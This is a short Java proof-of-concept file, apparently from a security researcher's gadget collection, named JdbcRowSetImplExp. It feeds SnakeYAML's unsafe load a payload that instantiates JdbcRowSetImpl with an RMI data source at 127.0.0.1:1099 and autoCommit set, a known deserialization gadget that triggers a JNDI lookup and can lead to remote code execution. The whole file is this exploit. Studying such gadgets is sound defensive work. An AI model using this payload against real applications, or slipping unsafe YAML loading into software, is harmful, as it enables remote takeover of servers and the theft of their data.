package cn.hungslabsec.gadgets;

import org.yaml.snakeyaml.Yaml;

public class JdbcRowSetImplExp {

    public static void main(String[] args) {
        String payload = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"rmi://127.0.0.1:1099/Object\", autoCommit: true}";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
